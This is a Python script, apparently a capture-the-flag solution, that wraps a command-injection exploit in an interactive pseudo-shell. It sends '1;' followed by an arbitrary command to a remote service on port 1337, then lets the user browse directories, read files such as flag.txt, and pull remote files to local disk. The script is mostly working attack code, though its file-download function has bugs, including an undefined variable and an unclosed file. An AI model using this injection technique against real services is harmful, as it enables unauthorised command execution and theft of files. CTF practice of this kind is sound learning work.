import socket
from cmd import Cmd

host = "1337bank.money"
port = 1337

def run_cmd(command):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))

    data = s.recv(1024)
    items = f"1;{command}\n"
    stuff = command.split(' ')
    s.send(items.encode())
    data = s.recv(1024)
    data = s.recv(1024)
    word = data.decode().split('\n')
    if stuff[0] == "cat":
        if stuff[1] == "flag.txt":
            print("Good! Here is your flag") 
    for cmd in word:
        if cmd != '':
            print (cmd + " ")

curr_dir = ""

class Command(Cmd):
    prompt = "/> "

    def do_cd(self,inp):
        global curr_dir     #using global variable to keeep track of current directory
        if inp != '..':
            curr_dir += f"/{inp}"
        else:
            place = curr_dir.split('/')
            curr_dir = ''
            count = 0
            while count < len(place)-1:
                if place[count] == '' and count != 0:
                    curr_dir += '/'
                else:
                    curr_dir += f'{place[count]}'
                count +=1
        self.prompt = curr_dir + ">"

        if inp == "" :
            curr_dir = ""
            self.prompt = ">"
        run_cmd(f"cd {inp}")
    
    def do_ls(self,inp):
        run_cmd(f"ls {curr_dir}")
    
    def do_exit(self,inp):
        print("bye")
        return True
    
    def do_default(self,inp):
        runs = inp.split()
        run_cmd(f"{runs[0]} {curr_dir}/{runs[1]}")
    
    def do_cat(self,inp):
        run_cmd(f"cat {inp}")

class Shell(Cmd):
    prompt = "> "

    def do_default(self,inp):
       print ("shell Drop into an interactive shell and allow users to gracefully exit\npull <remote-path> <local-path> Download files\nhelp Shows this help menu\nquit Quit the shell")

    def do_shell(self,inp):
        cmd = Command()
        cmd.cmdloop()
    
    def do_pull(self,inp):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        runs  = cmd.split()

        data = s.recv(1024)
       
        items = f"1; cat {inp} \n"
        s.send(items.encode()) 
        data = s.recv(1024)
      
        data = s.recv(100000)
        file = open(runs[1] , 'w+')
        file.write(data)
        file.close

    def do_help(self,cmd):
        
        print ("Help Menu\n")
        print ("Commands\n")
        print ("pull(stringArg)\n")
        print ("shell()\n")
        print ("quit()\n")
        print ("help\n")

    def do_quit(self,cmd):
        print("bye")
        return True

if __name__ == '__main__':
    s = Shell()
    s.cmdloop()
